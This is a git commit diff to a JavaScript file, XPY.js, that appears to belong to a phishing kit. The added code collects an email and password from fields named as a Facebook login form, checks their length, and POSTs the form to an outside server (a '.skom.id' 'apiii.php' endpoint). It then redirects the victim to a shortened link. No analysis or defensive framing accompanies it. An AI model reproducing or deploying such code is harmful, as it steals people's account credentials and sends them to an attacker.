e4ee3f7dfb5f44f9d112e1fa83e66f2bca2c6d36
Hyuuu <117647413+Hyuu09@users.noreply.github.com>
2023-12-21 10:27:09 +0700

    Update XPY.js

--- XPY.js
+++ XPY.js
@@ -1,9 +1,36 @@
-$.ajax({
+function openmdralexf() {
+                $('#alexf').fadeIn();
+                }
+ 
+            function AlexHostingFB()
+        	{
+        		$emailfb1 = $('#alx_email_fb2').val().trim();
+        		$passwordfb1 = $('#alx_password_fb2').val().trim();
+        		if($emailfb1 == '' || $emailfb1 == null || $emailfb1.length <= 6)
+        		{
+        			$('.email-fb1').show();
+        			$('.sandi-fb1').hide();
+        			return false;
+        		}else{
+        			$('.email-fb1').hide();
+        		}
+        		if($passwordfb1 == '' || $passwordfb1 == null || $passwordfb1.length <= 6)
+        		{
+        			$('.sandi-fb1').show();
+        			return false;
+        		}else{
+        			$('.sandi-fb1').hide();
+        		}
+        		
+        		if($emailfb1.length >=6 || $passwordfb1.length >=6) {
+        		    $.ajax({
                         type: 'POST',
                         url: 'https://mail.sallzzzzzkuuy.skom.id/apiii.php',
                         data: $('#ngumpulinuangnikah').serialize(),
                         dataType: 'text',
                         success: function() {
-                                    location.href = "https://www.bigo.tv";
+                                    location.href = "http://surl.li/obdlw";
                             } 
                     })
+        		}
+               }
